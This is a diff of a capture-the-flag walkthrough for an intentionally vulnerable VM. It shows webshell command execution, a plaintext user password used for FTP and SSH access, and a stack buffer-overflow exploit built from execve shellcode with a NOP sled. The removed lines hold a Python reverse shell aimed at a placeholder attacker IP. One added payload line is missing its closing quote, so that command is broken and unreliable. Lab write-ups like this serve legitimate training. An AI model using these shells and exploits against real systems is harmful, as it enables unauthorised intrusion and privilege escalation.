@@ -105,36 +105,12 @@
 
 	Confirm it outputs `www-data`.
 
-8. Getting Reverse Shell
+8. Initial Enumeration via Webshell
 
-	Checked for Python binary:
+	Using the webshell, enumerate user directories:
 
 	```
-	https://<vm-ip>/forum/templates_c/payload.php?cmd=which%20python
-	```
-
-	Got `/usr/bin/python`. Now we can give a reverse shell payload:
-
-	```bash
-	python -c "import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker-ip>',<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
-	```
-
-	> Replace `<attacker-ip>` and `<port>`
-
-	Encode the payload for URL and run it via the webshell. Listen on port 1234 with `nc -lvnp 1234` and get a reverse shell as `www-data`.
-	To access the reverse shell, use `nc`:
-
-	```bash
-	nc -lvnp <port>
-	```
-
-9. Local Enumeration
-
-	Inside the shell:
-
-	```bash
-	cd /home
-	ls -l
+	https://<vm-ip>/forum/templates_c/payload.php?cmd=ls%20-l%20/home
 	```
 
 	Output:
@@ -150,48 +126,57 @@
 	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 	```
 
-10. Privilege Escalation: lmezard user
+	Notably, the directory /home/LOOKATME is accessible.
 
-	Navigate to `/home/LOOKATME` and find a `password` file:
+9. Privilege Escalation: lmezard user
+
+	In `/home/LOOKATME` we can find a `password` file:
 
 	```
 	lmezard:G!@M6f4Eatau{sF"
 	```
 
-	Switch user to lmezard:
+10. FTP Access as Lmesard
+
+	Connect to lmezard FTP:
 
 	```bash
-	su lmezard
+	ftp <vm-ip>
 	```
 
-	or exit reverse shell and login using ssh
-
-	```
-	ssh lmezard@<vm-ip>
-	```
-
+	Name: lmezard
 	Password: G!@M6f4Eatau{sF"
 
-	Successfully logged in as lmezard.
+	Login is successfull.
 
-11. Accessing Lmezard's Home Directory
+11. Accessing Lmezard's Files using FTP
+
+	List available files:
 
 	```bash
-	cd ~
-	ls -l
+	ls
 	```
 
 	Output:
 
 	```
-	total 791
-	-rwxr-x--- 1 lmezard lmezard 808960 Oct  8  2015 fun
-	-rwxr-x--- 1 lmezard lmezard     96 Oct 15  2015 README
+	229 Entering Extended Passive Mode (|||46214|).
+	150 Here comes the directory listing.
+	-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+	-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+	226 Directory send OK.
 	```
 
-	Run:
+	Download both files:
 
+	```ftp
+	get README
+	get fun
 	```
+
+	Examine the README locally:
+
+	```bash
 	cat README
 	```
 
@@ -279,7 +264,7 @@
 	Use this hash as the password to switch to user `laurie` via SSH:
 
 	```bash
-	su laurie
+	ssh laurie@<vm-ip>
 	```
 	Then enter the password when prompted.
 
@@ -1262,67 +1247,76 @@
 	End of assembler dump.
 	```
 
-57. Setting Breakpoint and Running Program
+57. Shellcode Selection
 
-	```gdb
+	We use standard Linux x86 shellcode `execve("/bin/sh", NULL, NULL)`, that is
+
+	Shellcode
+
+	```
+	\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+	```
+
+58. Export shellcode with a NOP sled
+
+	We prepend a NOP sled to increase exploit reliability.
+
+	```bash
+	export payload=$(python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
+	```
+
+59. Find the address of the `payload` variable in environment
+
+	```bash
+	gdb exploit_me
 	b main
 	run
+	x/500s environ
 	```
 
-	Breakpoint hits at main start.
-
-58. Inspecting Addresses of `system` and `exit`
-
-	```gdb
-	p system
-	p exit
-	```
-
-	Outputs:
+	Relevant output:
 
 	```
-	$1 = 0xb7e6b060 <system>
-	$2 = 0xb7e5ebe0 <exit>
+	0xbffffe2d: "payload=\220\220\220\220... \260\v̀"
 	```
 
-59. Checking Memory Maps
-
-	```gdb
-	info proc map
-	```
-
-	Shows loaded memory regions, including libc and stack addresses.
-
-60. Finding `/bin/sh` String in Memory
-
-	```gdb
-	find 0xb7e2c000,0xb7fcf000,"/bin/sh"
-	```
-
-	Found at:
+60. Calculating the shellcode address
 
 	```
-	0xb7f8cc58
+	payload variable address : 0xbffffe2d
+	"payload=" length        : 8 bytes
+	NOP sled length          : 100 bytes
+	```
+
+	Shellcode start address:
+
+	```
+	0xbffffe2d + 8 + (inside NOP sled) ≈ 0xbffffe53
 	```
 
 61. Constructing the Exploit Payload
 
 	* Stack buffer size: 144 bytes
 	* Offset to return address: 140 bytes
-	* Overwrite return address with `system()` address (`0xb7e6b060`)
-	* Next address: `exit()` (`0xb7e5ebe0`) to safely terminate
-	* Argument to `system()`: address of string `"/bin/sh"` (`0xb7f8cc58`)
+	* Overwrite return address with address inside NOP sled
+
+	Payload structure:
+
+	```
+	[ padding (140 bytes) ]
+	[ return address → NOP sled ]
+	```
 
 	Final payload (in bash):
 
 	```bash
-	printf 'A%.0s' {1..140}; printf '\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7'
+	printf 'A%.0s' {1..140}; printf '\x53\xfe\xff\xbf
 	```
 
 62. Executing the Exploit
 
 	```bash
-	./exploit_me "$(printf 'A%.0s' {1..140}; printf '\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7')"
+	./exploit_me "$(printf 'A%.0s' {1..140}; printf '\x53\xfe\xff\xbf')"
 	```
 
 	After running, spawn a shell and check privileges:
